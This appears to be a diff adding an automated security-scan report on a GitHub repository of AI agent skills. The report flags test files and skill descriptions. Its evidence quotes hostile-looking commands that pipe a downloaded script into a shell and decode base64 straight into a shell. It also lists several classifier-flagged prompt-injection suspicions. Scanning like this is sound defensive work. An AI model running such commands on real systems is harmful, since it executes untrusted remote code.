@@ -1,0 +1,119 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "UlyssesLeoLee/MAGOS",
+    "version": "551f7e454568f4ec108170ec80eea1d7e97e5938",
+    "download": "https://codeload.github.com/UlyssesLeoLee/MAGOS/tar.gz/551f7e454568f4ec108170ec80eea1d7e97e5938"
+  },
+  "archive_sha256": "c4d4835203de98925207d33de12191ce9e6ef57a30a83136ba51197b801bb662",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/tests/codex/guard/test_supply_chain.py",
+      "line": 174,
+      "evidence": "curl -LsSf https://example.com/i.sh | sh",
+      "file_sha256": "d672c8ef494588c0e2abc94fbd27e332e9bac9bce038d1b071d2603ff051ff66"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/tests/codex/guard/data/corpus.jsonl",
+      "line": 420,
+      "evidence": "curl -s file:///nonexistent | sh",
+      "file_sha256": "d0ae364a5a046d5c5ae008a35feaf296af76e72e88b33c7b668ff8e9399ae559"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/tests/codex/guard/data/corpus.jsonl",
+      "line": 372,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "d0ae364a5a046d5c5ae008a35feaf296af76e72e88b33c7b668ff8e9399ae559"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-sweep/SKILL.md",
+      "line": 34,
+      "evidence": "p=0.92 - Codex: the arguments are the text that follows `$git-sweep` in the user's mess",
+      "file_sha256": "45507d31b24903fb750ebc9bb25b09ca11892871e28bf9472255e35c76012636"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-recon/SKILL.md",
+      "line": 28,
+      "evidence": "p=0.92 - Codex: the arguments are the text that follows `$git-recon` in the user's mess",
+      "file_sha256": "ccb48a667f46fe3535e352e3f959fe81c2863012443a2d884aa537a164ed9384"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-recommend/SKILL.md",
+      "line": 29,
+      "evidence": "p=0.94 - Codex: the arguments are the text that follows `$git-recommend` in the user's ",
+      "file_sha256": "58f47c88434f05ee173f07df8d13e8373128c755414d8b824898f0441689a14e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-plan/SKILL.md",
+      "line": 55,
+      "evidence": "p=0.92 - Codex: the arguments are the text that follows `$git-plan` in the user's messa",
+      "file_sha256": "5576c1ec2da0021e31c3b90caa7d24a62a832f8b50b38f8e460060200b0567d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-integrate/SKILL.md",
+      "line": 29,
+      "evidence": "p=0.96 - Codex: the arguments are the text that follows `$git-integrate` in the user's ",
+      "file_sha256": "5d67b2a81639308970ca09975b69f16527507b4a3c46ebc70403f79cd0b23ed2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/skills/git-converge/SKILL.md",
+      "line": 30,
+      "evidence": "p=0.94 - Codex: the arguments are the text that follows `$git-converge` in the user's m",
+      "file_sha256": "a4d367939210cc2544e3066bc5f804446f796a2d6dc02888cece03d114314bb7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "MAGOS-551f7e454568f4ec108170ec80eea1d7e97e5938/SKILL.md",
+      "line": 48,
+      "evidence": "p=0.93 Do **not** activate merely because Git is mentioned. Pure conceptual questions s",
+      "file_sha256": "32865ca0f7f26be5ae86f19c04bd6364e5c952a41f15efe2c26f08e31c29b65c"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "agent-plugins.org",
+    "agentskills.io",
+    "antigravity.google",
+    "example.com",
+    "example.invalid",
+    "geminicli.com",
+    "get.example.invalid",
+    "github.com",
+    "hooks.slack.com",
+    "json-schema.org",
+    "www.apache.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
